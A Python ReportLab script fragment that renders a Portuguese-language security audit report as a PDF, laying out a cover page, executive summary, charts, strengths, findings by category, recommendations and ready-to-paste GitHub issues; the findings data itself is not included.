styles.add(ParagraphStyle(name="H2c", fontName="Helvetica-Bold", fontSize=13, textColor=colors.HexColor(DARK), spaceAfter=8, spaceBefore=14))
styles.add(ParagraphStyle(name="H3c", fontName="Helvetica-Bold", fontSize=10.5, textColor=colors.HexColor(DARK), spaceAfter=4, spaceBefore=10))
styles.add(ParagraphStyle(name="Bodyc", parent=styles["Normal"], fontName="Helvetica", fontSize=9.3, leading=13.2, textColor=colors.HexColor("#1F2937"), alignment=TA_JUSTIFY))
styles.add(ParagraphStyle(name="Bodyc_left", parent=styles["Bodyc"], alignment=TA_LEFT))
styles.add(ParagraphStyle(name="Mono", fontName="Courier", fontSize=7.6, leading=10.4, textColor=colors.HexColor("#111827"), backColor=colors.HexColor("#F3F4F6")))
styles.add(ParagraphStyle(name="Small", parent=styles["Normal"], fontName="Helvetica", fontSize=8, leading=11, textColor=colors.HexColor(MUTED)))
styles.add(ParagraphStyle(name="CoverNote", parent=styles["Bodyc"], fontSize=9, leading=13.5))
styles.add(ParagraphStyle(name="ChipText", fontName="Helvetica-Bold", fontSize=7.6, textColor=colors.white, alignment=TA_CENTER, leading=9))
styles.add(ParagraphStyle(name="TableCell", parent=styles["Bodyc"], fontSize=8, leading=11, alignment=TA_LEFT))
styles.add(ParagraphStyle(name="TableHeader", parent=styles["Bodyc"], fontName="Helvetica-Bold", fontSize=8.5, leading=11, alignment=TA_LEFT, textColor=colors.white))
styles.add(ParagraphStyle(name="MonoBlock", fontName="Courier", fontSize=8, leading=11.5, textColor=colors.HexColor("#111827")))


def severity_chip(sev):
    t = Table([[Paragraph(SEV_LABELS[sev].upper(), styles["ChipText"])]], colWidths=[2.35 * cm], rowHeights=[0.55 * cm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(SEV_COLORS[sev])),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("ROUNDEDCORNERS", [4, 4, 4, 4]),
        ("LEFTPADDING", (0, 0), (-1, -1), 2),
        ("RIGHTPADDING", (0, 0), (-1, -1), 2),
    ]))
    return t


def code_block(text):
    escaped = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    escaped = escaped.replace("\n", "<br/>")
    return Paragraph(escaped, styles["Mono"])


def p(text, style="Bodyc"):
    return Paragraph(text, styles[style])


def loc(f):
    return f"{f['file']}:{f['lines']}" if f["lines"] else f["file"]


def build_pdf():
    donut_path = make_donut_chart()
    bar_path = make_bar_chart()

    doc = SimpleDocTemplate(
        OUTPUT_PDF, pagesize=A4,
        leftMargin=MARGIN, rightMargin=MARGIN, topMargin=2.1 * cm, bottomMargin=1.8 * cm,
        title=REPORT_TITLE, author="Auditoria de Segurança",
    )

    story = []

    # ── Capa ──
    story.append(Spacer(1, 8.6 * cm))
    story.append(p("<b>Escopo auditado</b>", "H3c"))
    story.append(p(SCOPE_NOTE, "CoverNote"))
    story.append(Spacer(1, 0.4 * cm))
    story.append(p("<b>Nota metodológica</b>", "H3c"))
    story.append(p(STACK_NOTE, "CoverNote"))
    story.append(PageBreak())

    # ── Resumo executivo ──
    story.append(p("Resumo executivo", "H1c"))
    counts = {s: 0 for s in SEV_ORDER}
    for f in FINDINGS:
        counts[f["severity"]] += 1
    total = len(FINDINGS)
    summary_bits = " · ".join(f"{SEV_LABELS[s]}: {counts[s]}" for s in SEV_ORDER if counts[s] > 0)
    story.append(p(
        f"A auditoria cobriu as 5 categorias solicitadas, mapeadas para a stack Next.js/Prisma/"
        f"MySQL detectada (ver nota metodológica na capa). Foram identificados <b>{total} achados "
        f"acionáveis</b> ({summary_bits}), nenhum deles crítico. Duas categorias (isolamento de "
        f"tenant e permissão definida no navegador) não se aplicam à arquitetura atual — single-"
        f"tenant, usuário único — e são detalhadas na seção seguinte. A categoria IDOR foi "
        f"integralmente percorrida sem nenhum achado explorável.",
        "Bodyc",
    ))
    story.append(Spacer(1, 0.3 * cm))

    chart_table = Table(
        [[Image(donut_path, width=8.6 * cm, height=7.4 * cm), Image(bar_path, width=8.6 * cm, height=4.1 * cm)]],
        colWidths=[8.8 * cm, 8.8 * cm],
    )
    chart_table.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
    story.append(p("Achados por severidade", "H3c"))
    story.append(p("Achados por categoria (cor = maior severidade na categoria)", "H3c"))
    story.append(chart_table)
    story.append(PageBreak())

    # ── Pontos fortes / fracos ──
    story.append(p("Pontos fortes", "H1c"))
    story.append(p(
        "O que foi verificado no código e está protegido corretamente — evidencia a cobertura "
        "da auditoria além dos achados de risco.", "Bodyc",
    ))
    story.append(Spacer(1, 0.2 * cm))
    for title, evidence in STRENGTHS:
        row = Table(
            [[Table([[""]], colWidths=[0.28 * cm], rowHeights=[0.28 * cm],
                    style=TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(STRONG_COLOR)), ("ROUNDEDCORNERS", [3, 3, 3, 3])])),
              p(f"<b>{title}</b><br/>{evidence}", "Bodyc_left")]],
            colWidths=[0.7 * cm, 16.3 * cm],
        )
        row.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "TOP"), ("TOPPADDING", (0, 0), (-1, -1), 3), ("BOTTOMPADDING", (0, 0), (-1, -1), 7)]))
        story.append(row)

    story.append(Spacer(1, 0.3 * cm))
    story.append(p("Pontos fracos", "H1c"))
    story.append(p(WEAKNESSES_INTRO, "Bodyc"))
    story.append(Spacer(1, 0.15 * cm))
    for f in FINDINGS:
        story.append(p(f"<b>{f['id']} ({SEV_LABELS[f['severity']]}):</b> {f['title']} — {loc(f)}", "Bodyc_left"))
        story.append(Spacer(1, 3))
    story.append(PageBreak())

    # ── Achados detalhados ──
    story.append(p("Achados detalhados", "H1c"))
    story.append(p(
        "Categorias sem achado explorável nesta auditoria: <b>Isolamento de inquilino/dono</b> "
        "(não aplicável — projeto single-tenant, sem RLS/middleware de tenant/tenant_id, "
        "verificado no schema Prisma e no payload de sessão) e <b>Permissão definida no "
        "navegador</b> (não aplicável — nenhum gate de papel encontrado no frontend; usuário "
        "único de admin, toda ação sensível já validada no servidor). <b>IDOR</b> foi percorrida "
        "integralmente (19 rotas) sem achado explorável.", "Bodyc",
    ))
    story.append(Spacer(1, 0.25 * cm))

    cat_titles = {
        "4_secrets": "4 — Chaves expostas",
        "5_xss": "5 — XSS / Input sem tratamento",
        "6_extra": "Achados adicionais (fora das 5 categorias solicitadas)",
    }
    for cat_key in ["4_secrets", "5_xss", "6_extra"]:
        items = [f for f in FINDINGS if f["category"] == cat_key]
        if not items:
            continue
        category_title = p(cat_titles[cat_key], "H2c")
        for i, f in enumerate(items):
            header_row = Table(
                [[severity_chip(f["severity"]), p(f"<b>{f['id']} — {f['title']}</b>", "Bodyc_left")]],
                colWidths=[2.5 * cm, 14.5 * cm],
            )
            header_row.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
            block = [
                *( [category_title, Spacer(1, 2)] if i == 0 else [] ),
                header_row,
                Spacer(1, 4),
                p(f"<font face='Courier' size=8>{loc(f)}</font>", "Bodyc_left"),
                Spacer(1, 4),
                code_block(f["snippet"]),
                Spacer(1, 5),
                p(f"<b>Por que é explorável:</b> {f['why']}", "Bodyc_left"),
                Spacer(1, 3),
                p(f"<b>Impacto:</b> {f['impact']}", "Bodyc_left"),
                Spacer(1, 3),
                p(f"<b>Condição de exploração:</b> {f['exploit_conditions']}", "Bodyc_left"),
                Spacer(1, 3),
                p(f"<b>Sugestão de correção:</b> {f['fix']}", "Bodyc_left"),
                Spacer(1, 14),
            ]
            story.append(KeepTogether(block))
    story.append(PageBreak())

    # ── Recomendações ──
    story.append(p("Recomendações priorizadas", "H1c"))
    rec_data = [[p("Prior.", "TableHeader"), p("Recomendação", "TableHeader"), p("Achado", "TableHeader")]]
    for prio, text, ref in RECOMMENDATIONS:
        rec_data.append([p(f"<b>{prio}</b>", "TableCell"), p(text, "TableCell"), p(ref, "TableCell")])
    rec_table = Table(rec_data, colWidths=[1.6 * cm, 13.4 * cm, 2.0 * cm], repeatRows=1)
    rec_table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor(DARK)),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor(LIGHT_BG)]),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
    ]))
    story.append(rec_table)
    story.append(PageBreak())

    # ── Issues GitHub ──
    story.append(p("Issues para o GitHub", "H1c"))
    story.append(p(
        "Texto pronto para copiar e colar na criação de cada issue. Achados triviais do mesmo "
        "tema foram mantidos como issues individuais nesta auditoria por já serem poucos e "
        "distintos entre si — nenhum agrupamento foi necessário.", "Bodyc",
    ))
    story.append(Spacer(1, 0.2 * cm))
    for block_md in ISSUES_MD:
        story.append(code_block(block_md))
        story.append(Spacer(1, 12))

    def on_first_page(c, d):
        cover_page(c, d)

    def on_later_pages(c, d):
        header_footer(c, d)

    doc.build(story, onFirstPage=on_first_page, onLaterPages=on_later_pages)
    return OUTPUT_PDF


if __name__ == "__main__":
    out = build_pdf()
    print(f"PDF gerado: {out}")
